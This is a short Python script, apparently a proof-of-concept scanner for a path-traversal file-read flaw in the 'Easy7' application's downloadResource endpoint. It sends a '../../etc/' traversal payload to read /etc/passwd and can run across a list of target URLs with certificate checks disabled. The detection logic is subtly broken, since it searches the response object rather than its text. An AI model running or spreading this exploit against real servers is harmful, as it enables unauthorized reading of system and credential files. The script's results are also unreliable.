import requests
from requests import RequestException
import argparse

requests.packages.urllib3.disable_warnings()


def check(target):
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded"
    }

    url = '/Easy7/rest/file/downloadResource'

    if not target.startswith("http"):
        target = f"http://{target}"

    data = {"path":"passwd", "srsPathId":"../../etc/"}

    try:
        resp = requests.post(target + url, headers=headers, data=data, verify=False, timeout=30)
        if 'root:x:0:0:root' in resp:
            print(f"{target} 存在漏洞")
    except RequestException as e:
        print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, 'r') as f:
                file_content = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for i in file_content:
            check(i.strip())
    check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Check easy7 downloadResource file read")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test url File")

    args = parser.parse_args()
    main(args)